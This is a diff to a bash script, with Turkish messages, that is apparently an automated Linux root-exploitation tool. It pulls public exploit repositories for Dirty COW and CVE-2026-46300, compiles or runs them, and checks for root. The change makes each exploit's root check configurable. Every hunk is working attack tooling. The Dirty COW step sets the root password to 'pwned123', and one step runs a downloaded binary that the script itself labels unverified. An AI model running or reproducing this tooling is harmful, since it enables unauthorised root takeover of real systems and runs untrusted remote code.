@@ -254,11 +254,11 @@ out_shows_root() {
 }
 
 run() {
-    local cmd="$1" name="${2:-$1}" SURE="${3:-90}"
+    local cmd="$1" name="${2:-$1}" SURE="${3:-90}" VERIFY="${4:-id}"
     echo -e "${CYAN}[>] Deneniyor: $name${NC}"
     echo "==== $name :: $cmd ====" >> $LOGFILE
     local OUT=$WRK/.out.$$
-    local RCMD="$cmd; id 2>&1"
+    local RCMD="$cmd; $VERIFY 2>&1"
     local TIMEOUT_KILLED=0
     if [ "$HAS_TIMEOUT" = "1" ] && command -v setsid >/dev/null 2>&1; then
         setsid bash -c "$RCMD" </dev/null >"$OUT" 2>&1 &
@@ -412,7 +412,7 @@ fi
 # --- Dirty COW (CVE-2016-5195) ---
 in_krange "2.6.22-4.8" || warn "Dirty COW: cekirdek aralik disinda (< 4.8.3), yine de deneniyor"
 if [ "$HAS_GCC" = "1" ]; then
-    fetch_repo firefart/dirtycow dcow && run "cd dcow && gcc -pthread -o dcow dirtycow.c -lcrypt && printf 'pwned123\n' | ./dcow && printf 'pwned123\n' | su -c id root" "Dirty COW" || warn "firefart/dirtycow cekilemedi"
+    fetch_repo firefart/dirtycow dcow && run "cd dcow && gcc -pthread -o dcow dirtycow.c -lcrypt && printf 'pwned123\n' | ./dcow" "Dirty COW" 90 "printf 'pwned123\n' | su -c id root" || warn "firefart/dirtycow cekilemedi"
 fi
 
 # --- Dirty Pipe (CVE-2022-0847) ---
@@ -606,7 +606,7 @@ fi
 
 # --- CVE-2026-46300 (hazir binary) ---
 warn "CVE-2026-46300: dogrulanmamis ikili, yine de deneniyor"
-fetch_repo ExploitEoom/CVE-2026-46300 c46300 && run "cd c46300 && chmod +x exploit && ./exploit" "CVE-2026-46300" || warn "ExploitEoom/CVE-2026-46300 cekilemedi"
+fetch_repo ExploitEoom/CVE-2026-46300 c46300 && run "cd c46300 && chmod +x exploit && ./exploit" "CVE-2026-46300" 90 "/usr/bin/su -c id 2>/dev/null" || warn "ExploitEoom/CVE-2026-46300 cekilemedi"
 
 # --- CVE-2026-64600 ---
 if [ "$HAS_GCC" = "1" ]; then
